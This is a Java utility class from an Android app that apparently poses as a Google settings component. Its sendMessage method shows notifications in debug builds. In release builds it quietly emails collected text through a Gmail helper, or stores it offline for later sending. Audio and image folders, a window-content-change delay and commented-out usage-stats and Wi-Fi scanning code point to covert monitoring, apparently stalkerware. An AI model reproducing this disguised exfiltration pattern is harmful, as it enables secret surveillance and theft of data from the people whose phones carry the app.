package com.setting.dl.google.googlesettings;


import android.app.ActivityManager;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Handler;
import android.os.Looper;
import android.support.v4.app.NotificationCompat;

import com.setting.dl.google.googlesettings.mail.gmail.Mail;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Date;
import java.util.Locale;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;


public class u {
	
	
	public static final long DEBUG_MOD_WINDOW_CONTENT_CHANGED_DELAY   = 30000L;
	public static final long RELEASE_MOD_WINDOW_CONTENT_CHANGED_DELAY = 180000L;
	
	public static final MyLogger log = MyLogger.jLog();
	
	public static void sendMessage(Context context, String title, String text) {
		
	    text += "\n" + dateStamp();
	    
		if (BuildConfig.DEBUG) {
			
			createNotification(context, title, text);
		}
		else {
			
			if (isDeviceOnline(context)) {
				
				Mail.send(context, title, text);
			}
			else{
				
				saveValue(context, title + ".txt", text);
			}
		}
	}
	
	public static void freeMemory() {
		System.runFinalization();
		Runtime.getRuntime().gc();
		System.gc();
	}
	
	
	
	synchronized
	public static void saveValue(Context context, String fileName, String value) {
		
		File file = new File(context.getFilesDir(), fileName);
		
		FileOutputStream stream;
		
		try {
			
			stream = new FileOutputStream(file, true);
			stream.write(value.getBytes());
			stream.close();
			
		}
		catch (IOException ignored) {}
	}
	
	public static String getDate(long milis) {
		
		return Time.whatTimeIsIt(new Date(milis));
		
		//return s("%te %<tB %<tY %<tA %<tH:%<tM:%<tS", date);
		
	}
	
	public static String getDate(String milis) {
		
		try {
			
			return Time.whatTimeIsIt(new Date(Long.valueOf(milis)));
			
		}
		catch (NumberFormatException e) {
			
			return milis;
		}
		
		//return s("%te %<tB %<tY %<tA %<tH:%<tM:%<tS", date);
		//SimpleDateFormat sdf  = new SimpleDateFormat(s("dd MMMM yyyy %tA HH:mm:ss", date), new Locale("tr"));
		//return sdf.format(date);
	}
	
	public static String getDate(Date date) {
		
		return Time.whatTimeIsIt(date);
		
		//return s("%te %<tB %<tY %<tA %<tH:%<tM:%<tS", date);
		//SimpleDateFormat dateFormat = new SimpleDateFormat(s("dd MMMM yyyy %tA HH:mm:ss", date), new Locale("tr"));
		//return dateFormat.format(date);
	}
	
	static public String s(String msg, Object... params) {
		
		return String.format(new Locale("tr"), msg, params);
	}
	
	public static boolean isDeviceOnline(Context context) {
		
		ConnectivityManager connMgr = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
		
		if (connMgr == null) return false;
		
		NetworkInfo networkInfo = connMgr.getActiveNetworkInfo();
		return (networkInfo != null && networkInfo.isConnected());
	}
	
	public static boolean isMyServiceRunning(Context context, Class<?> serviceClass) {
		
		ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
		
		if (manager == null) return false;
		
		for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
			
			if (serviceClass.getName().equals(service.service.getClassName())) {
				return true;
			}
		}
		return false;
	}
	
	public static Handler run(Runnable runnable, long delay) {
		
		Handler handler = new Handler(Looper.getMainLooper());
		
		handler.postDelayed(runnable, delay);
		return handler;
		
	}
	
	public static void runThread(final Runnable runnable) { new Thread(runnable).start(); }
	
	public static void runThread(final Runnable runnable, final int delay) {
		
		new Timer().schedule(new TimerTask() {
			@Override
			public void run() {
				runnable.run();
			}
		}, delay);
		
		
	}
	
	public static String getAudioFolder(Context context) {
		
		File audioFolder = new File(context.getFilesDir(), "audio");
		
		if (!audioFolder.exists()) {
			
			if (audioFolder.mkdir()) {
				
				return audioFolder.getAbsolutePath();
			}
		}
		else {
			
			return audioFolder.getAbsolutePath();
		}
		
		
		return context.getFilesDir() + "/" + "audio";
	}
	
	public static String getImageFolder(Context context) {
		
		File imageFolder = new File(context.getFilesDir(), "image");
		
		if (!imageFolder.exists()) {
			
			if (imageFolder.mkdir()) {
				
				return imageFolder.getAbsolutePath();
			}
		}
		
		
		return context.getFilesDir() + "/" + "image";
	}
	
	public static String dateStamp() {
		
		return getDate(new Date()) + "\n";
	}
	
	public static void createNotification(Context context, String title, String text) {
		
		String CHANNEL_ID = "0412";
		String CHANNEL_NAME = "xyz.channel";
		
		NotificationManager mNotificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
		
		if (mNotificationManager == null) return;
		
		
		NotificationCompat.Builder mBuilder =
				new NotificationCompat.Builder(context, CHANNEL_ID)
						.setContentText(text).setStyle(new NotificationCompat.BigTextStyle())
						.setSmallIcon(R.mipmap.system)
						.setContentTitle(title)
						/*.setColor(Color.YELLOW)
						.setLights(Color.YELLOW, 500, 2000)
						.setVibrate(new long[]{0, 0, 0, 150})*/;
        
        /*
        mBuilder.setDefaults(
                Notification.DEFAULT_SOUND
                             );
        */
		
        
        
        
		if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
			
			int                 importance          = NotificationManager.IMPORTANCE_HIGH;
			NotificationChannel notificationChannel = new NotificationChannel(CHANNEL_ID, CHANNEL_NAME, importance);
		
			mBuilder.setChannelId(CHANNEL_ID);
			mNotificationManager.createNotificationChannel(notificationChannel);
		}
		
		mNotificationManager.notify(new Random().nextInt(), mBuilder.build());
  
		
		
	}
		/*public static void runThread(final Runnable runnable, final int delay, final int period) {
		
		new Timer().schedule(new TimerTask() {
			@Override
			public void run() {
				runnable.run();
			}
		}, delay, period);
		
		
	}*/
	/*	public static Handler run(final Runnable runnable) {
		
		final Handler handler = new Handler(Looper.getMainLooper());
		
		handler.post(runnable);
		return handler;
	}*/
	
	/*public static boolean hasUsageStat(@NonNull final Context context) {
		// Usage Stats is theoretically available on API v19+, but official/reliable support starts with API v21.
		if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
			return false;
		}
		
		final AppOpsManager appOpsManager = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
		
		if (appOpsManager == null) {
			return false;
		}
		
		final int mode = appOpsManager.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), context.getPackageName());
		if (mode != AppOpsManager.MODE_ALLOWED) {
			return false;
		}
		
		// Verify that access is possible. Some devices "lie" and return MODE_ALLOWED even when it's not.
		final long        now                = System.currentTimeMillis();
		UsageStatsManager mUsageStatsManager = null;
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
			mUsageStatsManager = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
		}
		List<UsageStats> stats = null;
		if (mUsageStatsManager != null) {
			stats = mUsageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, now - 1000 * 10, now);
		}
		return (stats != null && !stats.isEmpty());
	}
	
	
	public static void scaleImage(Context context, ImageView view) {
		Drawable drawing = view.getDrawable();
		if (drawing == null) {
			return;
		}
		Bitmap bitmap = ((BitmapDrawable) drawing).getBitmap();
		
		int width     = bitmap.getWidth();
		int height    = bitmap.getHeight();
		int xBounding = view.getWidth();//EXPECTED WIDTH
		int yBounding = view.getHeight();//EXPECTED HEIGHT
		
		float xScale = ((float) xBounding) / width;
		float yScale = ((float) yBounding) / height;
		
		Matrix matrix = new Matrix();
		matrix.postScale(xScale, yScale);
		
		Bitmap scaledBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height, matrix, true);
		width = scaledBitmap.getWidth();
		height = scaledBitmap.getHeight();
		BitmapDrawable result = new BitmapDrawable(context.getResources(), scaledBitmap);
		
		view.setImageDrawable(result);

        *//*CoordinatorLayout.LayoutParams params = (CoordinatorLayout.LayoutParams) view.getLayoutParams();
        params.width = width;
        params.height = height;
        view.setLayoutParams(params);*//*
	}
	
	
	public static int dpToPx(Context context, int dp) {
		float density = context.getResources().getDisplayMetrics().density;
		return Math.round((float) dp * density);
	}*/
    
    
    /*
    public static long toLong(String value) {
    
        return Long.parseLong(value);
    }
    
    public static int toInt(String value) {
    
        return Integer.parseInt(value);
    }
    */
    
    
    
    /*
    
    
    public static boolean deleteFileFromSD(Context context, String fileName) {
        
        File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath(), fileName);
        
        return file.exists() && file.delete();
        
    }
    
    public static void run(Runnable runnable) {
        
        Handler handler = new Handler(Looper.getMainLooper());
        
        handler.post(runnable);
    }
    
    
    static public void p(Context context, String msg) {
        
        Toast t = Toast.makeText(context, msg, Toast.LENGTH_LONG);
        //t.setGravity(Gravity.BOTTOM, 0, 300);
        t.show();
        
    }
    
    
    @NonNull
    public static String connectionType(final Context context) {
        
        final ConnectivityManager connectivityManager = (ConnectivityManager) context.getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
        
        if(connectivityManager == null) return "connectivityManager null";
        
        final int         type        = connectivityManager.getActiveNetworkInfo().getType();
        final NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
        
        switch (type) {
            
            case ConnectivityManager.TYPE_MOBILE:
                return "mobile";
            
            case ConnectivityManager.TYPE_WIFI:
                return "wifi";
        }
        return "";
        
    }
   
    
    public void zipFolder(String inputFolderPath, String outZipPath) {
        
        try {
            FileOutputStream fos     = new FileOutputStream(outZipPath);
            ZipOutputStream  zos     = new ZipOutputStream(fos);
            File             srcFile = new File(inputFolderPath);
            File[]           files   = srcFile.listFiles();
            
            
            Log.d("", "Zip directory: " + srcFile.getName());
            
            for (int i = 0; i < files.length; i++) {
                
                Log.d("", "Adding file: " + files[i].getName());
                
                byte[] buffer = new byte[1024];
                
                FileInputStream fis = new FileInputStream(files[i]);
                
                zos.putNextEntry(new ZipEntry(files[i].getName()));
                
                int length;
                
                while ((length = fis.read(buffer)) > 0) {
                    
                    zos.write(buffer, 0, length);
                }
                
                zos.closeEntry();
                fis.close();
            }
            zos.close();
        }
        catch (IOException ioe) {
            Log.e("", ioe.getMessage());
        }
    }
    
    public static void unzip(File zipFile, File targetDirectory) throws IOException {
        
        try (ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(zipFile)))) {
            
            ZipEntry ze;
            int      count;
            byte[]   buffer = new byte[8192];
            
            while ((ze = zis.getNextEntry()) != null) {
                
                File file = new File(targetDirectory, ze.getName());
                File dir  = ze.isDirectory() ? file : file.getParentFile();
                
                if (!dir.isDirectory() && !dir.mkdirs())
                    throw new FileNotFoundException("Failed to ensure directory: " + dir.getAbsolutePath());
                
                if (ze.isDirectory())
                    continue;
                
                try (FileOutputStream fout = new FileOutputStream(file)) {
                    
                    while ((count = zis.read(buffer)) != -1)
                        fout.write(buffer, 0, count);
                }
            }
        }
    }
     */
    
   
    /*
    
    
    public static String[] getAudioFilesFromSD() {
        
        
        File dir = new File(Environment.getExternalStorageDirectory().getAbsolutePath());
        
        String[] files = null;
        
        if (dir.exists()) {
            
            files = dir.list(new FilenameFilter() {
                
                @Override
                public boolean accept(File dir, String name) {
                    return name.toLowerCase().endsWith(".mp3");
                }
            });
        }
        
        return files;
    }
    */
    
    
    /*
    public static Object[] getWifiList(final Context context) {
        
        
        final WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        
        wifiManager.startScan();
        List<String>     list        = new ArrayList<>();
        List<ScanResult> scanResults = wifiManager.getScanResults();
        
        for (ScanResult scanResult : scanResults) {
            
            list.add(scanResult.toString());
            
        }
        
        return list.toArray();
    }
    */
   
    
    /*
    public static String intToIp(int i) {
        
        return ((i >> 24) & 0xFF) + "." +
                ((i >> 16) & 0xFF) + "." +
                ((i >> 8) & 0xFF) + "." +
                (i & 0xFF);
    }
    */
		/*public static void setAlarm(Context context){
		
		AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
		
		if(alarmManager == null) return;
		
		Intent intent = new Intent(context, AlarmReciever.class);
		
		PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 4, intent, 0);
		
		alarmManager.setRepeating(AlarmManager.RTC, new Date().getTime() + 3000, 60000 * 60, pendingIntent);
		
		log.i("Alarm set");
	}*/
	
	
}





















